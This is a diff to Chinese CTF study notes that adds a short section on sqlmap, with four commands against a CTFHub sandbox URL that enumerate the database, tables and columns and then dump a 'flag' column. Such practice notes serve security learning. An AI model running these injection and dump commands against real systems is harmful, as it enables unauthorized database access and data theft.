@@ -37,4 +37,18 @@ vim异常退出后，会存储临时文件，如下三种
 ### Git泄露
 主要用到GitHack,Git_Extract
 
+## SQL
 
+### SQLmap的使用
+
+```shell
+python sqlmap.py -u http://challenge-07d7ae9cbbdb5f5e.sandbox.ctfhub.com:10800/?id=1 --current-db
+
+python sqlmap.py -u http://challenge-07d7ae9cbbdb5f5e.sandbox.ctfhub.com:10800/?id=1 -D sqli --tables
+
+python sqlmap.py -u http://challenge-07d7ae9cbbdb5f5e.sandbox.ctfhub.com:10800/?id=1 -D sqli -T flag --columns
+
+python sqlmap.py -u http://challenge-07d7ae9cbbdb5f5e.sandbox.ctfhub.com:10800/?id=1 -D sqli -T flag -C flag --dump
+```
+
+依次为查询最近使用的数据库，查询表，查询字段，转存数据
